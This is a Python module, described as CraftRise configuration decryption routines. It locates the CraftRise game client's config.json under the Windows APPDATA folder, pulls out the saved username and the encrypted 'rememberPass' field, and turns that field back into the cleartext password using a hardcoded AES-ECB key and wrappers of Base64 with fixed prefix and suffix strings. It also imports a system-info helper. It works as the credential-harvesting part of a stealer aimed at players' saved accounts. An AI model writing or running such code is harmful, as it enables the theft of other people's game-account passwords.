"""CraftRise configuration decryption routines."""

from __future__ import annotations

import base64
import json
import os
from typing import Dict, Any

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

from .system_info import get_system_info

_AES_KEY = b"2640023187059250"
_RISE_PREFIX = "3ebi2mclmAM7Ao2"
_RISE_SUFFIX = "KweGTngiZOOj9d6"


def decrypt_base64(encoded_str: str) -> str:
    """Decode a Base64 string to UTF-8 text.

    Args:
        encoded_str: Base64-encoded payload.

    Returns:
        Decoded UTF-8 string, or an empty string on failure.
    """
    try:
        return base64.b64decode(encoded_str).decode("utf-8")
    except Exception:
        return ""


def decrypt_rise_version(s: str) -> str:
    """Remove CraftRise-specific obfuscation wrappers.

    The payload is expected to be double-Base64-encoded and wrapped with
    a fixed prefix / suffix.  If the wrapper is missing the intermediate
    result is returned as-is.

    Args:
        s: Obfuscated string.

    Returns:
        De-obfuscated string, or the original on failure.
    """
    try:
        s1 = decrypt_base64(s)
        s2 = decrypt_base64(s1)

        if not (s2.startswith(_RISE_PREFIX) and s2.endswith(_RISE_SUFFIX)):
            return s2

        core = s2[len(_RISE_PREFIX) : len(s2) - len(_RISE_SUFFIX)]
        return decrypt_base64(core)
    except Exception:
        return s


def decrypt_aes(encrypted_base64: str) -> str:
    """Decrypt an AES-ECB encrypted Base64 payload.

    .. warning::
        ECB mode is not semantically secure.  This implementation mirrors
        the original CraftRise client behaviour.

    Args:
        encrypted_base64: Base64-encoded ciphertext.

    Returns:
        Decrypted plaintext, or an empty string on failure.
    """
    try:
        encrypted_data = base64.b64decode(encrypted_base64)
        cipher = AES.new(_AES_KEY, AES.MODE_ECB)
        decrypted = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        return decrypted.decode("utf-8")
    except Exception:
        return ""


def decrypt_password(encrypted_pass: str) -> str:
    """Full decryption pipeline for a CraftRise password field.

    Args:
        encrypted_pass: Raw value from the ``rememberPass`` config key.

    Returns:
        Clear-text password (stops at ``#`` if present), or empty string.
    """
    try:
        decrypted_aes = decrypt_aes(encrypted_pass)
        if not decrypted_aes:
            return ""

        result = decrypt_rise_version(decrypted_aes)
        if "#" in result:
            return result.split("#", 1)[0]
        return result
    except Exception:
        return ""


def read_craftrise_config() -> Dict[str, Any]:
    """Read and decrypt the local CraftRise configuration file.

    Returns:
        A structured result dict with the following keys:
        - ``success`` (bool): Whether decryption succeeded.
        - ``error`` (str | None): Human-readable error message.
        - ``config_found`` (bool): Whether the file exists.
        - ``data`` (dict): Extracted configuration fields.
    """
    result: Dict[str, Any] = {
        "success": False,
        "error": None,
        "config_found": False,
        "data": {},
    }

    try:
        appdata = os.getenv("APPDATA")
        if not appdata:
            result["error"] = "APPDATA environment variable not found"
            return result

        config_path = os.path.join(appdata, ".craftrise", "config.json")
        if not os.path.exists(config_path):
            result["error"] = f"Config file not found: {config_path}"
            return result

        result["config_found"] = True

        with open(config_path, "r", encoding="utf-8") as fh:
            config_data = json.load(fh)

        result["data"] = {
            "username": config_data.get("rememberName", ""),
            "encrypted_password": config_data.get("rememberPass", ""),
            "version": config_data.get("version", ""),
            "client_ram": config_data.get("clientRam", ""),
            "windows_type": config_data.get("windowsType", ""),
            "display": config_data.get("display", ""),
            "is_optimized_config": config_data.get("isOptimizedConfig", False),
        }

        if result["data"]["encrypted_password"]:
            result["data"]["decrypted_password"] = decrypt_password(
                result["data"]["encrypted_password"]
            )
            result["success"] = True
        else:
            result["error"] = "Encrypted password not found"

        return result
    except Exception as exc:
        result["error"] = f"Config read error: {exc}"
        return result
